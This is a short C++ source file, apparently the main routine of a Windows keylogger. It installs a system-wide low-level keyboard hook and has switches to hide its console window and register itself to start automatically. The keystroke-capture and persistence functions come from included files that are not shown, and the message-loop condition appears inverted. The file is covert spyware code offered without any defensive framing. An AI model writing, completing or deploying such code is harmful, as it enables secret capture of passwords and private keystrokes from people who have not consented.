#include "define.h"
#include "keyhook.cpp"
#include "functions.cpp"

int main(int argc, const char* argv[]) {
	bool hideWindow = false;
	bool rootStartup = false;

	//begin routine
	
	if (IsWindowVisible(::GetConsoleWindow()) != FALSE && hideWindow) {
		ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}

	if(rootStartup) autoStart();

	HHOOK lowlevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(lowlevelKybd);
	return 0;
}